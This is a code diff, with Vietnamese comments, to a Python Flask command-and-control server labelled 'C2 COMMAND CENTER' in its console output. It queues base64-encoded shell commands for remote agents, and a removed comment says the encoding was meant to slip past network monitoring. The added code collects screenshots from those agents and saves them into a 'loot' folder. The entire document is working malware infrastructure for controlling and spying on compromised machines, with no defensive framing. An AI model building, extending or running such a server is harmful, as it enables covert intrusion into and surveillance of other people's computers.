@@ -5,7 +5,8 @@ import datetime
 import threading
 import time
 import sys
-import base64  
+import base64
+import os  
 
 # Tắt log mặc định của Flask
 import logging
@@ -16,6 +17,10 @@ app = Flask(__name__)
 
 # Cấu trúc: {'ID': {'name': '...', 'tasks': ['lenh1', 'lenh2'], 'results': []}}
 agents = {}
+
+# Tạo thư mục 'loot' để lưu dữ liệu thu thập được (ảnh, file) nếu chưa tồn tại
+if not os.path.exists('loot'):
+    os.makedirs('loot')
 
 def generate_id():
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
@@ -55,9 +60,32 @@ def receive_result(agent_id):
     if agent_id in agents:
         encoded_output = request.form.get('result')
         if encoded_output:
-            # --- decode kết quả từ Agent trước khi in ---
-            decoded_output = safe_decode(encoded_output)
-            print(f"\n[v] Result from {agents[agent_id]['name']} ({agent_id}):\n{decoded_output}")
+            # Giải mã kết quả từ Agent
+            decoded = safe_decode(encoded_output)
+            
+            # Kiểm tra xem dữ liệu trả về có phải là ảnh chụp màn hình không
+            # Quy ước: Agent gửi chuỗi bắt đầu bằng "[IMAGE] "
+            if decoded.startswith("[IMAGE] "):
+                try:
+                    # Tách phần header và phần dữ liệu ảnh base64
+                    _, img_b64 = decoded.split(" ", 1)
+                    
+                    # Tạo tên file dựa trên tên agent và thời gian
+                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+                    filename = f"loot/shot_{agents[agent_id]['name']}_{timestamp}.png"
+                    
+                    # Giải mã base64 sang binary và ghi ra file
+                    with open(filename, "wb") as f:
+                        f.write(base64.b64decode(img_b64))
+                        
+                    print(f"\n[+] Screenshot captured from {agents[agent_id]['name']}")
+                    print(f"    Saved to: {filename}")
+                except Exception as e:
+                    print(f"\n[!] Error saving screenshot: {e}")
+            else:
+                # Nếu là văn bản bình thường thì in ra console
+                print(f"\n[v] Result from {agents[agent_id]['name']} ({agent_id}):\n{decoded}")
+            
             print("C2 > ", end="", flush=True)
     return '', 200
 
@@ -67,7 +95,7 @@ def console_thread():
     time.sleep(2) 
     print("\n=== C2 COMMAND CENTER ===")
     print("Syntax: set <agent_id> <command>")
-    print("Example: set A1B2C3 whoami")
+    print("Special: set <agent_id> screenshot") # Hướng dẫn lệnh mới
     
     while True:
         try:
@@ -80,8 +108,7 @@ def console_thread():
                 plain_task = parts[2] # Lệnh dạng clear text
                 
                 if target_id in agents:
-                    # --- Mã hóa lệnh trước khi đẩy vào hàng đợi ---
-                    # Mã hóa để bypass các thiết bị giám sát mạng cơ bản
+                    # Mã hóa lệnh trước khi đẩy vào hàng đợi
                     encoded_task = base64.b64encode(plain_task.encode()).decode()
                     
                     agents[target_id]['tasks'].append(encoded_task)
